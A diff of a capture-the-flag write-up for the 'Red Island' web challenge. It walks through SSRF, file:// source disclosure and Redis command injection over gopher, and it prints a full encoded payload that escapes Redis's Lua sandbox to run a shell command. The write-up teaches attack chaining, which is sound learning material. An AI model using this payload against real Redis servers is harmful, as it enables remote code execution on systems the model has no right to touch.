@@ -1,9 +1,9 @@
 ---
 title: 'Cyber Apocalypse CTF 2022: Red Island [web - 325pts]'
 date: '2022-05-19'
-tags: ['ssrf', 'redis', 'rce', 'ctf']
+tags: ['SSRF', 'REDIS', 'RCE', 'CTF']
 description: "For this web challenge we'll chain together multiple vulnerabilities, starting from a simple SSRF and resulting in RCE through a Redis service."
-image: ''
+image: '/blog-images/cactf-red-island/challenge-home-page.png'
 draft: false
 ---
 
@@ -16,7 +16,7 @@ Upon first accessing the challenge application, we find a basic login/registrati
 The application is very small, with a single page. There is a logout button and more interestingly another form which is asking for a picture url, the button contains the text "convert". If we were to submit a valid link to an image, the app would grab it, process it (i.e. make it much more red) and return it back to us. The intended use of the app is not helpful in solving this challenge but if we look at the request itself we can see it is sending JSON post data containing the supplied URL.
 
 <BlogImage 
-    src="/images/cactf-red-island/challenge-home-page.png"
+    src="/blog-images/cactf-red-island/challenge-home-page.png"
     alt="challenge-home-page.png"
     width="782"
     height="284" 
@@ -29,7 +29,7 @@ If you have a bit of experience with web application testing or CTFs, your mind 
 Before we continue, I think it is good to highlight the importance of error messages. If we break the request by submitting an invalid JSON structure (simply adding an erroneous apostrophe), the application complains. In this complaint is another vulnerability; an information disclosure. Reading this error message we can see the local file path of the application, which saves us some time/guessing later. 
 
 <BlogImage 
-    src="/images/cactf-red-island/error-path-disclosure.png"
+    src="/blog-images/cactf-red-island/error-path-disclosure.png"
     alt="error-path-disclosure.png"
     width="766"
     height="315" 
@@ -38,7 +38,7 @@ Before we continue, I think it is good to highlight the importance of error mess
 As in other challenges, a good first idea is to try and learn more about the application itself by reading the application source code. In this case it is pretty simple, we can use the file:// scheme instead of http, and combined with our knowledge of the app location from the earlier info disclosure we can easily retrieve the source code of the main file /app/index.js 
 
 <BlogImage 
-    src="/images/cactf-red-island/index-source-code.png"
+    src="/blog-images/cactf-red-island/index-source-code.png"
     alt="index-source-code.png"
     width="762"
     height="256" 
@@ -139,7 +139,7 @@ QUIT        # Second command: first argument value
 Of course, sending some of these characters (like CRLF) over an HTTP request is no good so we URL encode the special characters, which gives the messy string seen earlier with all the %0D%0A stuff. Sending this simple request as a test to the challenge shows that we can indeed execute redis commands in this way. Note that it may take multiple requests to get a proper response, sometimes we just get a generic error. When it works, we see inside the error text the response to the Redis cmd - "sess:TpBkT-zG-PLzxuH-yzZ3-S5SGVpY23ag" 
 
 <BlogImage 
-    src="/images/cactf-red-island/redis-keys.png"
+    src="/blog-images/cactf-red-island/redis-keys.png"
     alt="redis-keys.png"
     width="761"
     height="220" 
@@ -225,7 +225,7 @@ QUIT
 The response from the challenge server confirms we have full-blown RCE (remember it may take a few attempts). 
 
 <BlogImage 
-    src="/images/cactf-red-island/rce-id.png"
+    src="/blog-images/cactf-red-island/rce-id.png"
     alt="rce-id.png"
     width="762"
     height="231" 
@@ -236,14 +236,14 @@ The response from the challenge server confirms we have full-blown RCE (remember
 <div style={{ textAlign: "center", paddingBottom: "1rem" }}>`gopher://127.0.0.1:6379/_%2A3%0D%0A%244%0D%0AEVAL%0D%0A%24197%0D%0Alocal%20io_l%20%3D%20package.loadlib%28%27/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%27%2C%20%27luaopen_io%27%29%3B%0Alocal%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%27cat%20/root/flag%27%2C%20%27r%27%29%3B%20local%20res%20%3D%20f%3Aread%28%27%2Aa%27%29%3B%20f%3Aclose%28%29%3B%20return%20res%0D%0A%241%0D%0A0%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A `</div>
 
 <BlogImage 
-    src="/images/cactf-red-island/rce-cat-flag.png"
+    src="/blog-images/cactf-red-island/rce-cat-flag.png"
     alt="rce-cat-flag.png"
     width="761"
     height="230" 
 />
 
 <BlogImage 
-    src="/images/cactf-red-island/flag-on-dashboard.png"
+    src="/blog-images/cactf-red-island/flag-on-dashboard.png"
     alt="flag-on-dashboard.png"
     width="840"
     height="292" 
